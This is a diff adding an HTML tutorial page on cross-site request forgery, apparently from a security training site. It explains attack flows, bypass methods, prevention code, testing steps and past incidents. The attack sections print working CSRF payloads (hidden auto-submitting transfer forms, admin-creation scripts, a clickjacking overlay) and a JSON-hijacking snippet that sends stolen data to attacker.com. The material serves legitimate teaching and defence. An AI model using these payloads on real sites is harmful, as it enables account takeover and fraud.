@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cross-Site Request Forgery (CSRF) - Comprehensive Guide</title>
+    <link rel="stylesheet" href="../../src/web-assets/dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css">
+    <style>
+        .learn-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        
+        .back-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 24px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-decoration: none;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+        
+        .back-nav:hover {
+            background-color: rgba(0, 255, 65, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
+        
+        .page-header {
+            text-align: center;
+            padding: 60px 20px;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.1), rgba(13, 255, 146, 0.05));
+            border-radius: 12px;
+            margin-bottom: 50px;
+            border: 2px solid var(--primary-color);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
+        }
+        
+        .page-header h1 {
+            color: var(--primary-color);
+            font-size: 3rem;
+            margin-bottom: 15px;
+            text-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+        }
+        
+        .page-header p {
+            color: var(--text-secondary);
+            font-size: 1.3rem;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .content-section {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 40px;
+            margin-bottom: 30px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(0, 255, 65, 0.1);
+        }
+        
+        .content-section:hover {
+            box-shadow: 0 4px 20px rgba(0, 255, 65, 0.15);
+        }
+        
+        .content-section h2 {
+            color: var(--primary-color);
+            font-size: 2rem;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary-color);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .content-section h2:before {
+            content: "▸";
+            color: var(--secondary-color);
+            font-size: 2.5rem;
+        }
+        
+        .content-section h3 {
+            color: var(--secondary-color);
+            font-size: 1.5rem;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        
+        .content-section h4 {
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            margin-top: 25px;
+            margin-bottom: 12px;
+        }
+        
+        .content-section p {
+            color: var(--text-color);
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+        
+        .content-section ul, .content-section ol {
+            margin-left: 25px;
+            margin-bottom: 20px;
+            color: var(--text-color);
+        }
+        
+        .content-section li {
+            margin-bottom: 12px;
+            line-height: 1.7;
+        }
+        
+        .content-section li strong {
+            color: var(--secondary-color);
+        }
+        
+        .content-section code {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 3px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            border: 1px solid var(--border-color);
+        }
+        
+        .content-section pre {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 25px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 25px 0;
+            border: 1px solid var(--primary-color);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+        }
+        
+        .content-section pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: var(--text-color);
+            font-size: 0.95em;
+        }
+        
+        .content-section a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-bottom: 1px dashed var(--secondary-color);
+            transition: all 0.3s;
+        }
+        
+        .content-section a:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+        
+        .content-section strong {
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+        
+        .toc {
+            background: rgba(0, 255, 65, 0.05);
+            border: 2px solid var(--primary-color);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .toc h3 {
+            color: var(--primary-color);
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+        }
+        
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+        
+        .toc li {
+            margin-bottom: 10px;
+        }
+        
+        .toc a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px;
+            border-radius: 4px;
+            transition: all 0.3s;
+        }
+        
+        .toc a:hover {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--primary-color);
+            padding-left: 15px;
+        }
+        
+        .toc a:before {
+            content: "→";
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="learn-container">
+        <a href="../index.html" class="back-nav">
+            <i class="fas fa-arrow-left"></i> Back to Attack Flows
+        </a>
+        
+        <div class="page-header">
+            <h1><i class="fas fa-user-secret"></i> Cross-Site Request Forgery (CSRF)</h1>
+            <p>Complete Guide to Understanding, Exploiting, and Preventing CSRF Attacks</p>
+        </div>
+        
+        <div class="toc">
+            <h3><i class="fas fa-list"></i> Table of Contents</h3>
+            <ul>
+                <li><a href="#section-0">What is CSRF?</a></li>
+                <li><a href="#section-1">How CSRF Attacks Work</a></li>
+                <li><a href="#section-2">Types of CSRF Attacks</a></li>
+                <li><a href="#section-3">Advanced CSRF Techniques</a></li>
+                <li><a href="#section-4">CSRF Bypass Methods</a></li>
+                <li><a href="#section-5">Prevention & Mitigation</a></li>
+                <li><a href="#section-6">Detection & Testing</a></li>
+                <li><a href="#section-7">Real-World Examples</a></li>
+                <li><a href="#section-8">Quick Reference</a></li>
+            </ul>
+        </div>
+        
+        <div class="content-section" id="section-0">
+            <h2>What is Cross-Site Request Forgery (CSRF)?</h2>
+            <p>Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to execute unwanted actions on a web application. It exploits the trust that a web application has in the user's browser by tricking the victim into submitting a malicious request while authenticated.</p>
+            
+            <h3>Why is CSRF Dangerous?</h3>
+            <p>CSRF attacks are particularly dangerous because:</p>
+            <ul>
+                <li><strong>Invisible to Victims:</strong> Users don't know they're performing the action</li>
+                <li><strong>Leverages Trust:</strong> Exploits the application's trust in authenticated users</li>
+                <li><strong>Wide Impact:</strong> Can affect any state-changing operation</li>
+                <li><strong>No User Interaction Needed:</strong> Can be completely automatic</li>
+                <li><strong>Bypasses Authentication:</strong> Works even with strong passwords</li>
+                <li><strong>Hard to Trace:</strong> Requests appear legitimate</li>
+            </ul>
+            
+            <h3>Attack Capabilities</h3>
+            <p>Successful CSRF attacks allow attackers to:</p>
+            <ul>
+                <li>Change user passwords and email addresses</li>
+                <li>Make unauthorized fund transfers</li>
+                <li>Purchase items or services</li>
+                <li>Change account settings and preferences</li>
+                <li>Post content on behalf of the victim</li>
+                <li>Delete user data</li>
+                <li>Modify access permissions</li>
+                <li>Create new admin accounts</li>
+            </ul>
+        </div>
+        
+        <div class="content-section" id="section-1">
+            <h2>How CSRF Attacks Work</h2>
+            
+            <h3>Basic Attack Flow</h3>
+            <ol>
+                <li><strong>Victim Authenticates:</strong> User logs into a vulnerable web application</li>
+                <li><strong>Session Established:</strong> Browser stores session cookie</li>
+                <li><strong>Attacker Crafts Malicious Request:</strong> Creates a request that performs an action</li>
+                <li><strong>Victim Visits Malicious Site:</strong> User browses attacker-controlled page</li>
+                <li><strong>Automatic Request Sent:</strong> Browser automatically includes session cookie</li>
+                <li><strong>Action Executed:</strong> Application processes request as legitimate</li>
+            </ol>
+            
+            <h3>Simple CSRF Example</h3>
+            <pre><code class="language-html">&lt;!-- Vulnerable application endpoint --&gt;
+http://bank.com/transfer?to=attacker&amount=1000
+
+&lt;!-- Attacker's malicious page --&gt;
+&lt;html&gt;
+&lt;body&gt;
+    &lt;h1&gt;You won a prize!&lt;/h1&gt;
+    &lt;img src="http://bank.com/transfer?to=attacker&amount=1000" style="display:none"&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            
+            <h3>POST Request CSRF</h3>
+            <pre><code class="language-html">&lt;!-- Auto-submitting form --&gt;
+&lt;html&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+    &lt;form action="http://bank.com/transfer" method="POST"&gt;
+        &lt;input type="hidden" name="to" value="attacker"/&gt;
+        &lt;input type="hidden" name="amount" value="1000"/&gt;
+    &lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            
+            <h3>Why It Works</h3>
+            <p>CSRF exploits the fact that:</p>
+            <ul>
+                <li>Browsers automatically include cookies with every request to a domain</li>
+                <li>Applications trust requests containing valid session cookies</li>
+                <li>Forms can be submitted from any origin</li>
+                <li>Images, scripts, and other resources can trigger GET requests</li>
+            </ul>
+        </div>
+        
+        <div class="content-section" id="section-2">
+            <h2>Types of CSRF Attacks</h2>
+            
+            <h3>1. GET-Based CSRF</h3>
+            <p>Exploits applications that perform state-changing operations via GET requests.</p>
+            <pre><code class="language-html">&lt;!-- Image tag attack --&gt;
+&lt;img src="http://vulnerable.com/delete_account?confirm=yes"&gt;
+
+&lt;!-- iframe attack --&gt;
+&lt;iframe src="http://vulnerable.com/change_email?email=attacker@evil.com"&gt;&lt;/iframe&gt;
+
+&lt;!-- Link attack --&gt;
+&lt;a href="http://vulnerable.com/transfer?to=attacker&amount=999"&gt;Click for prize!&lt;/a&gt;</code></pre>
+            
+            <h3>2. POST-Based CSRF</h3>
+            <p>More common and typically more serious, as POST is used for sensitive operations.</p>
+            <pre><code class="language-html">&lt;html&gt;
+&lt;body&gt;
+&lt;form id="csrf-form" action="https://vulnerable.com/api/transfer" method="POST"&gt;
+    &lt;input type="hidden" name="recipient" value="attacker"/&gt;
+    &lt;input type="hidden" name="amount" value="5000"/&gt;
+&lt;/form&gt;
+&lt;script&gt;
+    document.getElementById('csrf-form').submit();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+            
+            <h3>3. JSON/AJAX CSRF</h3>
+            <p>Targets applications using JSON APIs without proper CSRF protection.</p>
+            <pre><code class="language-javascript">&lt;script&gt;
+fetch('https://vulnerable.com/api/update_profile', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+        email: 'attacker@evil.com',
+        role: 'admin'
+    })
+});
+&lt;/script&gt;</code></pre>
+            
+            <h3>4. File Upload CSRF</h3>
+            <p>Tricks users into uploading malicious files.</p>
+            <pre><code class="language-html">&lt;form action="https://vulnerable.com/upload" method="POST" enctype="multipart/form-data"&gt;
+    &lt;input type="hidden" name="file" value="malicious_content"/&gt;
+    &lt;input type="hidden" name="filename" value="backdoor.php"/&gt;
+&lt;/form&gt;</code></pre>
+            
+            <h3>5. Same-Site CSRF</h3>
+            <p>Exploits vulnerabilities within the same site, such as through stored XSS or subdomain takeovers.</p>
+        </div>
+        
+        <div class="content-section" id="section-3">
+            <h2>Advanced CSRF Techniques</h2>
+            
+            <h3>1. Time-Based CSRF</h3>
+            <pre><code class="language-html">&lt;!-- Delay attack until user is likely authenticated --&gt;
+&lt;script&gt;
+setTimeout(() =&gt; {
+    document.getElementById('csrf-form').submit();
+}, 30000); // Wait 30 seconds
+&lt;/script&gt;</code></pre>
+            
+            <h3>2. CSRF with XSS</h3>
+            <pre><code class="language-javascript">// Stored XSS payload that performs CSRF
+&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open('POST', '/admin/create_user', true);
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+xhr.withCredentials = true;
+xhr.send('username=hacker&password=pass123&role=admin');
+&lt;/script&gt;</code></pre>
+            
+            <h3>3. Multi-Step CSRF</h3>
+            <pre><code class="language-javascript">// Step 1: Get current CSRF token
+fetch('/get_token')
+    .then(r =&gt; r.json())
+    .then(data =&gt; {
+        // Step 2: Use token in attack
+        fetch('/admin/promote', {
+            method: 'POST',
+            headers: {'X-CSRF-Token': data.token},
+            body: 'user=attacker'
+        });
+    });
+</code></pre>
+            
+            <h3>4. Login CSRF</h3>
+            <p>Force victim to log into attacker's account.</p>
+            <pre><code class="language-html">&lt;form action="https://vulnerable.com/login" method="POST"&gt;
+    &lt;input type="hidden" name="username" value="attacker_account"/&gt;
+    &lt;input type="hidden" name="password" value="attacker_password"/&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></pre>
+            
+            <h3>5. CSRF Token Fixation</h3>
+            <pre><code class="language-html">&lt;!-- Force user to use attacker-controlled token --&gt;
+&lt;iframe src="https://vulnerable.com/get_csrf_token"&gt;&lt;/iframe&gt;
+&lt;script&gt;
+// Extract and reuse the token
+&lt;/script&gt;</code></pre>
+            
+            <h3>6. Clickjacking + CSRF</h3>
+            <pre><code class="language-html">&lt;!-- Overlay transparent iframe over fake button --&gt;
+&lt;style&gt;
+iframe { opacity: 0.0001; position: absolute; top: 0; left: 0; }
+&lt;/style&gt;
+&lt;button&gt;Click for free prize!&lt;/button&gt;
+&lt;iframe src="https://vulnerable.com/delete_account"&gt;&lt;/iframe&gt;</code></pre>
+        </div>
+        
+        <div class="content-section" id="section-4">
+            <h2>CSRF Protection Bypass Methods</h2>
+            
+            <h3>1. Token Bypass Techniques</h3>
+            
+            <h4>Missing Token Validation</h4>
+            <pre><code class="language-html">&lt;!-- Simply omit the CSRF token --&gt;
+&lt;form action="/transfer" method="POST"&gt;
+    &lt;input type="hidden" name="amount" value="1000"/&gt;
+    &lt;!-- No csrf_token field --&gt;
+&lt;/form&gt;</code></pre>
+            
+            <h4>Empty Token</h4>
+            <pre><code class="language-html">&lt;form action="/transfer" method="POST"&gt;
+    &lt;input type="hidden" name="csrf_token" value=""/&gt;
+    &lt;input type="hidden" name="amount" value="1000"/&gt;
+&lt;/form&gt;</code></pre>
+            
+            <h4>Method Override</h4>
+            <pre><code class="language-html">&lt;!-- Change POST to GET to bypass token check --&gt;
+&lt;img src="/transfer?csrf_token=&amount=1000"&gt;
+
+&lt;!-- Or use _method parameter --&gt;
+&lt;form action="/transfer?_method=POST" method="GET"&gt;
+    &lt;input name="amount" value="1000"/&gt;
+&lt;/form&gt;</code></pre>
+            
+            <h3>2. SameSite Cookie Bypass</h3>
+            <pre><code class="language-javascript">// If SameSite=Lax, top-level navigation works
+window.location = 'https://vulnerable.com/transfer?to=attacker&amount=1000';
+
+// Or use 302 redirect
+&lt;meta http-equiv="refresh" content="0;url=https://vulnerable.com/action"&gt;</code></pre>
+            
+            <h3>3. Subdomain Takeover</h3>
+            <p>If an abandoned subdomain can be taken over, CSRF protection may not apply.</p>
+            <pre><code class="language-html">&lt;!-- From attacker-controlled subdomain.example.com --&gt;
+&lt;form action="https://example.com/transfer" method="POST"&gt;
+    &lt;!-- May bypass SameSite and Referer checks --&gt;
+&lt;/form&gt;</code></pre>
+            
+            <h3>4. Regex Bypass</h3>
+            <pre><code class="language-html">&lt;!-- If referer check uses weak regex --&gt;
+&lt;!-- Expecting: https://vulnerable.com/* --&gt;
+&lt;!-- Bypass with: https://vulnerable.com.attacker.com --&gt;</code></pre>
+            
+            <h3>5. JSON Hijacking</h3>
+            <pre><code class="language-html">&lt;script&gt;
+Object.prototype.__defineSetter__('data', function(val) {
+    // Steal JSON response
+    fetch('https://attacker.com/steal?data=' + JSON.stringify(val));
+});
+&lt;/script&gt;
+&lt;script src="https://vulnerable.com/api/sensitive_data"&gt;&lt;/script&gt;</code></pre>
+        </div>
+        
+        <div class="content-section" id="section-5">
+            <h2>Prevention & Mitigation</h2>
+            
+            <h3>1. CSRF Tokens (Synchronizer Token Pattern)</h3>
+            <pre><code class="language-php">// PHP Example
+session_start();
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+}
+
+// In form
+?&gt;
+&lt;form method="POST" action="/transfer"&gt;
+    &lt;input type="hidden" name="csrf_token" 
+           value="&lt;?php echo $_SESSION['csrf_token']; ?&gt;"&gt;
+    &lt;!-- Other fields --&gt;
+&lt;/form&gt;
+
+&lt;?php
+// Validation
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
+        die('CSRF token validation failed');
+    }
+    // Process request
+}</code></pre>
+            
+            <h3>2. SameSite Cookie Attribute</h3>
+            <pre><code class="language-php">// Set SameSite attribute on session cookies
+setcookie('session_id', $session_id, [
+    'samesite' =&gt; 'Strict',  // or 'Lax'
+    'secure' =&gt; true,
+    'httponly' =&gt; true
+]);</code></pre>
+            
+            <h3>3. Double Submit Cookie Pattern</h3>
+            <pre><code class="language-javascript">// JavaScript
+const csrfToken = generateRandomToken();
+document.cookie = `csrf_token=${csrfToken}; SameSite=Strict`;
+
+fetch('/api/action', {
+    method: 'POST',
+    headers: {
+        'X-CSRF-Token': csrfToken
+    },
+    body: formData
+});</code></pre>
+            
+            <h3>4. Custom Request Headers</h3>
+            <pre><code class="language-javascript">// Frontend
+fetch('/api/action', {
+    method: 'POST',
+    headers: {
+        'X-Requested-With': 'XMLHttpRequest',
+        'X-Custom-Header': 'application-specific-value'
+    }
+});
+
+// Backend - validate custom header exists
+if (!request.headers['X-Requested-With']) {
+    return 403;
+}</code></pre>
+            
+            <h3>5. Referer/Origin Header Validation</h3>
+            <pre><code class="language-python"># Python/Flask example
+from urllib.parse import urlparse
+
+@app.before_request
+def check_referer():
+    if request.method in ['POST', 'PUT', 'DELETE']:
+        referer = request.headers.get('Referer')
+        origin = request.headers.get('Origin')
+        
+        allowed_origins = ['https://example.com']
+        
+        if referer:
+            referer_origin = urlparse(referer).netloc
+            if referer_origin not in allowed_origins:
+                abort(403)
+        elif origin:
+            if origin not in allowed_origins:
+                abort(403)
+        else:
+            abort(403)</code></pre>
+            
+            <h3>6. User Interaction Requirement</h3>
+            <pre><code class="language-javascript">// Require CAPTCHA or re-authentication for sensitive actions
+if (isSensitiveAction && !verifyCaptcha()) {
+    return error('Please complete CAPTCHA');
+}
+
+// Or require password re-entry
+if (isHighRiskAction && !verifyPassword()) {
+    return error('Please re-enter your password');
+}</code></pre>
+            
+            <h3>Prevention Checklist</h3>
+            <ul>
+                <li>✓ Implement CSRF tokens for all state-changing requests</li>
+                <li>✓ Use SameSite cookie attribute (Strict or Lax)</li>
+                <li>✓ Validate Origin and Referer headers</li>
+                <li>✓ Avoid using GET for state-changing operations</li>
+                <li>✓ Require custom headers for AJAX requests</li>
+                <li>✓ Implement re-authentication for critical actions</li>
+                <li>✓ Use framework's built-in CSRF protection</li>
+                <li>✓ Set proper CORS policies</li>
+                <li>✓ Implement rate limiting</li>
+                <li>✓ Log and monitor suspicious activity</li>
+            </ul>
+        </div>
+        
+        <div class="content-section" id="section-6">
+            <h2>Detection & Testing</h2>
+            
+            <h3>Manual Testing Steps</h3>
+            <ol>
+                <li><strong>Identify State-Changing Requests:</strong> Find all actions that modify data</li>
+                <li><strong>Capture Valid Request:</strong> Use browser dev tools or proxy</li>
+                <li><strong>Create Test HTML:</strong> Build a form/script that replicates the request</li>
+                <li><strong>Remove CSRF Protection:</strong> Omit tokens or headers</li>
+                <li><strong>Test from Different Origin:</strong> Host on different domain and test</li>
+                <li><strong>Verify Execution:</strong> Check if action was performed</li>
+            </ol>
+            
+            <h3>Testing Checklist</h3>
+            <pre><code class="language-html">&lt;!-- Test 1: No CSRF token --&gt;
+&lt;form action="https://target.com/action" method="POST"&gt;
+    &lt;input name="field" value="test"/&gt;
+&lt;/form&gt;
+
+&lt;!-- Test 2: Empty CSRF token --&gt;
+&lt;form action="https://target.com/action" method="POST"&gt;
+    &lt;input name="csrf_token" value=""/&gt;
+    &lt;input name="field" value="test"/&gt;
+&lt;/form&gt;
+
+&lt;!-- Test 3: Invalid CSRF token --&gt;
+&lt;form action="https://target.com/action" method="POST"&gt;
+    &lt;input name="csrf_token" value="invalid123"/&gt;
+    &lt;input name="field" value="test"/&gt;
+&lt;/form&gt;
+
+&lt;!-- Test 4: Change method --&gt;
+&lt;img src="https://target.com/action?field=test"&gt;
+
+&lt;!-- Test 5: Swap token values --&gt;
+&lt;form action="https://target.com/action" method="POST"&gt;
+    &lt;input name="csrf_token" value="another_users_token"/&gt;
+    &lt;input name="field" value="test"/&gt;
+&lt;/form&gt;</code></pre>
+            
+            <h3>Automated Testing Tools</h3>
+            <ul>
+                <li><strong>Burp Suite:</strong> CSRF PoC Generator</li>
+                <li><strong>OWASP ZAP:</strong> Anti-CSRF Token Scanner</li>
+                <li><strong>CSRFTester:</strong> Dedicated CSRF testing tool</li>
+                <li><strong>XSRFProbe:</strong> Advanced CSRF audit toolkit</li>
+                <li><strong>Postman:</strong> Manual request crafting and testing</li>
+            </ul>
+            
+            <h3>Burp Suite CSRF PoC Generator</h3>
+            <ol>
+                <li>Intercept the target request</li>
+                <li>Right-click → Engagement Tools → Generate CSRF PoC</li>
+                <li>Customize the generated HTML</li>
+                <li>Test in browser from different origin</li>
+            </ol>
+        </div>
+        
+        <div class="content-section" id="section-7">
+            <h2>Real-World Examples</h2>
+            
+            <h3>Notable CSRF Vulnerabilities</h3>
+            
+            <h4>1. ING Direct (2008)</h4>
+            <p>CSRF vulnerability allowed attackers to transfer money from victim accounts by tricking them into visiting a malicious webpage.</p>
+            
+            <h4>2. YouTube (2008)</h4>
+            <p>CSRF flaw enabled attackers to perform nearly any action on behalf of authenticated users, including adding videos to playlists and subscribing to channels.</p>
+            
+            <h4>3. Netflix (2006)</h4>
+            <p>CSRF vulnerability allowed attackers to add DVDs to victim's rental queue and change account settings.</p>
+            
+            <h4>4. Gmail (2007)</h4>
+            <p>CSRF vulnerability in Gmail's chat feature could have been exploited to send messages and add contacts.</p>
+            
+            <h4>5. Twitter (2009)</h4>
+            <p>The "Don't Click" worm exploited CSRF to automatically post tweets and follow the attacker's account.</p>
+            
+            <h4>6. Router Vulnerabilities</h4>
+            <p>Many home routers suffered from CSRF vulnerabilities allowing attackers to change DNS settings, Wi-Fi passwords, and administrative credentials through malicious websites.</p>
+            
+            <h3>Impact Examples</h3>
+            <ul>
+                <li><strong>Financial Loss:</strong> Unauthorized fund transfers</li>
+                <li><strong>Account Takeover:</strong> Password and email changes</li>
+                <li><strong>Data Modification:</strong> Unwanted content posting</li>
+                <li><strong>Privacy Breach:</strong> Settings and preference changes</li>
+                <li><strong>Reputation Damage:</strong> Malicious actions under victim's identity</li>
+            </ul>
+        </div>
+        
+        <div class="content-section" id="section-8">
+            <h2>Quick Reference</h2>
+            
+            <h3>CSRF Attack Vectors</h3>
+            <pre><code class="language-html">&lt;!-- Image tag (GET) --&gt;
+&lt;img src="http://target.com/action?param=value"&gt;
+
+&lt;!-- Auto-submit form (POST) --&gt;
+&lt;body onload="document.forms[0].submit()"&gt;
+&lt;form action="http://target.com/action" method="POST"&gt;
+    &lt;input type="hidden" name="param" value="value"/&gt;
+&lt;/form&gt;
+
+&lt;!-- Fetch API --&gt;
+&lt;script&gt;
+fetch('http://target.com/api/action', {
+    method: 'POST',
+    credentials: 'include',
+    body: JSON.stringify({param: 'value'})
+});
+&lt;/script&gt;
+
+&lt;!-- XMLHttpRequest --&gt;
+&lt;script&gt;
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://target.com/action');
+xhr.withCredentials = true;
+xhr.send('param=value');
+&lt;/script&gt;</code></pre>
+            
+            <h3>Testing Quick Commands</h3>
+            <pre><code class="language-bash"># Using curl to test CSRF
+curl -X POST https://target.com/action \
+  -H "Cookie: session=victim_session" \
+  -d "param=value"
+
+# Without CSRF token should fail if protected
+curl -X POST https://target.com/action \
+  -H "Cookie: session=victim_session" \
+  -d "param=value" \
+  -d "csrf_token="</code></pre>
+            
+            <h3>Framework-Specific Protection</h3>
+            <pre><code class="language-python"># Django - CSRF middleware enabled by default
+# Template
+{% csrf_token %}
+
+# Flask with Flask-WTF
+from flask_wtf.csrf import CSRFProtect
+csrf = CSRFProtect(app)
+
+# Express.js with csurf
+const csurf = require('csurf');
+app.use(csurf({ cookie: true }));
+
+# Laravel - CSRF protection automatic
+&lt;form method="POST"&gt;
+    @csrf
+&lt;/form&gt;</code></pre>
+            
+            <h3>Testing Checklist Summary</h3>
+            <ol>
+                <li>Remove CSRF token completely</li>
+                <li>Use empty/invalid token</li>
+                <li>Change request method (POST to GET)</li>
+                <li>Test with another user's token</li>
+                <li>Test from different origin</li>
+                <li>Test with different Content-Type</li>
+                <li>Test without custom headers</li>
+                <li>Test SameSite cookie bypass</li>
+            </ol>
+            
+            <h3>Prevention Checklist Summary</h3>
+            <ol>
+                <li>Implement CSRF tokens</li>
+                <li>Use SameSite cookies</li>
+                <li>Validate Referer/Origin</li>
+                <li>Require custom headers</li>
+                <li>No state changes via GET</li>
+                <li>Re-authentication for critical actions</li>
+                <li>Proper CORS configuration</li>
+                <li>Regular security testing</li>
+            </ol>
+            
+            <h3>Resources</h3>
+            <ul>
+                <li><a href="https://owasp.org/www-community/attacks/csrf">OWASP CSRF Guide</a></li>
+                <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html">OWASP CSRF Prevention Cheat Sheet</a></li>
+                <li><a href="https://portswigger.net/web-security/csrf">PortSwigger CSRF</a></li>
+                <li><a href="https://github.com/OWASP/CheatSheetSeries">OWASP Cheat Sheet Series</a></li>
+            </ul>
+        </div>
+        
+    </div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-html.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+</body>
+</html>
